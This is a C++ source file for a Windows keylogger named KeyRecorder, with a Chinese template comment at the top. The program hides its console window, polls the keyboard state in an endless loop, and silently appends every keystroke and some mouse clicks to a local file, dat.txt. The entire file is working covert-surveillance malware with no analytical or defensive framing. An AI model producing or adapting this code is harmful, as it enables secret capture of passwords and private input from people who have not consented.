// KeyRecorder.cpp : 此檔案包含 'main' 函式。程式會於該處開始執行及結束執行。
//

#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <stdio.h>

#define _WIN32_WINNT 0x0500

using namespace std;

void Recording(string input)
{
	fstream LogFile;
	LogFile.open("dat.txt",fstream::app);
	if (LogFile.is_open())
	{
		LogFile << input;
		LogFile.close();
	}
}

boolean SpecialKeys(int KEY)
{
	switch (KEY)
	{
	case VK_SPACE:
		cout << " ";
		Recording(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		Recording("\n");
		return true;
	case '¾':
		cout << ".";
		Recording(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		Recording("#SHIFT");
		return true;
	case VK_BACK:
		cout << "\b";
		Recording("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		Recording("#R_CLICK");
		return true;
	default:
		return false;
	}
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true)
	{
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767)
			{
				if (!SpecialKeys(KEY))
				{
					fstream LogFile;
					LogFile.open("dat.txt",fstream::app);
					if (LogFile.is_open())
					{
						LogFile << char(KEY);
						LogFile.close();
					}
				}
			}
		}
	}
	return 0;
}
